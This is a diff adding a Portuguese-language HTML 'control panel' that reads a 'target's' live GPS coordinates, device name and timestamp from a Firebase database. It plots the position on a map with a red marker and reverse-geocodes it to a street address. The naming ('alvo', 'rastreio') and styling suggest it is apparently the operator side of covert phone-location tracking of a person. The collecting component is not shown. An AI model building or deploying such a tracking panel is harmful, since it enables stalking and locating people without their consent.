@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>SISTEMA INFINITY - PAINEL DE CONTROLE</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        body { background: #0b141a; color: #25d366; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
+        #map { height: 65vh; width: 100%; border: 2px solid #25d366; border-radius: 10px; margin-bottom: 15px; }
+        .data-panel { background: #121b22; padding: 15px; border: 1px solid #25d366; border-radius: 8px; }
+        .label { color: #fff; font-size: 11px; text-transform: uppercase; font-weight: bold; }
+        .value { color: #25d366; font-size: 15px; margin-bottom: 8px; }
+        .blink { animation: blinker 1.5s linear infinite; color: red; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        /* Ponto vermelho piscante no mapa */
+        .target-point { width: 18px; height: 18px; background: red; border-radius: 50%; box-shadow: 0 0 15px red; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(2.2); opacity: 0; } }
+    </style>
+</head>
+<body>
+
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+        <h2 style="margin:0">SISTEMA INFINITY VIRTUAL</h2>
+        <span id="status" class="blink">● AGUARDANDO SINAL...</span>
+    </div>
+
+    <div id="map"></div>
+
+    <div class="data-panel">
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+            <div>
+                <div class="label">Coordenadas GPS:</div>
+                <div id="coords" class="value">---, ---</div>
+                <div class="label">Precisão do Sinal:</div>
+                <div id="acc" class="value">---</div>
+            </div>
+            <div>
+                <div class="label">Dispositivo Alvo:</div>
+                <div id="dev" class="value">---</div>
+                <div class="label">Último Sinal:</div>
+                <div id="time" class="value">---</div>
+            </div>
+        </div>
+        <div style="margin-top: 10px; border-top: 1px solid #333; padding-top: 10px;">
+            <div class="label">Endereço Localizado:</div>
+            <div id="addr" class="value" style="color: #fff;">Aguardando sinal para mapear rua...</div>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <script>
+        const firebaseConfig = { databaseURL: "https://rastreio-infinity-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        var map = L.map('map').setView([-15.78, -47.92], 4);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        var targetMarker;
+
+        // Escuta o sinal do alvo
+        database.ref('alvo/sinal_ativo').on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data && data.lat) {
+                document.getElementById('status').innerText = "● SINAL RECEBIDO";
+                document.getElementById('status').style.color = "#25d366";
+                document.getElementById('status').classList.remove('blink');
+
+                document.getElementById('coords').innerText = data.lat + ", " + data.lon;
+                document.getElementById('acc').innerText = data.precisao;
+                document.getElementById('dev').innerText = data.dispositivo;
+                document.getElementById('time').innerText = data.timestamp;
+
+                // Atualiza Marcador e Zoom
+                if (targetMarker) map.removeLayer(targetMarker);
+                var redIcon = L.divIcon({ className: 'target-point', iconSize: [18, 18], iconAnchor: [9, 9] });
+                targetMarker = L.marker([data.lat, data.lon], {icon: redIcon}).addTo(map);
+                map.setView([data.lat, data.lon], 18);
+
+                // Busca o nome da rua (Geocoding Reverso)
+                fetch(`https://nominatim.openstreetmap.org/reverse?lat=${data.lat}&lon=${data.lon}&format=json`)
+                    .then(r => r.json())
+                    .then(loc => {
+                        document.getElementById('addr').innerText = loc.display_name;
+                    });
+            }
+        });
+    </script>
+</body>
+</html>
